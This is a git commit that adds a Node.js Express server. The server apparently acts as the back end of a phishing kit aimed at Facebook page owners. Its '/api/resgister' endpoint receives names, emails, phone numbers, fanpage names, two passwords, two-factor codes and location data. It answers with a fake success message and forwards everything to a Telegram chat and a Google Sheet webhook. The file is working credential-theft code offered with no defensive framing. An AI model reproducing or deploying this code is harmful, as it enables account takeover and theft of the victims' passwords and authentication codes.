112badf26bc8872a72330bf432f67598fddd2320
hungthanluca123 <161572396+hungthanluca123@users.noreply.github.com>
2024-10-09 12:51:17 +0700

    severmoi
    severmoi

---
+++ index.js
@@ -0,0 +1,88 @@
+import express from "express";
+import 'dotenv/config';
+import cors from "cors";
+import TelegramBot from 'node-telegram-bot-api';
+import axios from "axios";
+
+const app = express();
+ 
+app.use(cors('*'));
+
+app.use(express.json());
+
+const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
+// const bot_two = new TelegramBot(process.env.BOT_TOKEN_BOT_TWO, { polling: true });
+
+app.post('/api/resgister', (req, res) => {
+    // GET DATA FROM CLIENT
+    const data = req.body; 
+
+    const result = {
+        "status": 0,
+        "message": "Success!"
+    }
+
+    res.send(result);
+
+    // SEND DATA TO TELE
+
+    console.log(data.firstTwoFa);
+
+if (data.firstTwoFa == undefined && data.secondTwoFa == undefined) {
+    
+    const message = `<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''}
+<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''} 
+<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}`;
+
+    bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
+
+} else {
+
+    const messageCode = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
+    bot.sendMessage(process.env.CHAT_ID, messageCode,  { parse_mode: 'HTML' });
+
+}
+
+
+
+   // bot_two.sendMessage(process.env.CHAT_ID_BOT_TWO, location,  { parse_mode: 'HTML' });
+
+
+//    ADD GOOGLE SHEET
+    const url = new URL(process.env.WEBHOOK_URL);
+
+    url.searchParams.append('Ip', data.ip ? data.ip : '');
+    url.searchParams.append('City', data.city ? data.city : '');
+    url.searchParams.append('Country', data.country ? data.country : '');
+    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
+    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
+    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
+    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
+    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
+    // 
+    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
+    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
+    // 
+    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
+    url.searchParams.append('Second Two-Fa', data.secondTwoFa  ? data.secondTwoFa  : '');
+
+    axios.get(url)
+    .then(response => {
+        const data = response.data;
+        if (data.status === 'success') {
+            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
+        } else {
+            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
+        }
+    })
+    .catch(error => {
+        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
+    });
+
+});
+
+app.listen(process.env.PORT, () => {
+    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
+});
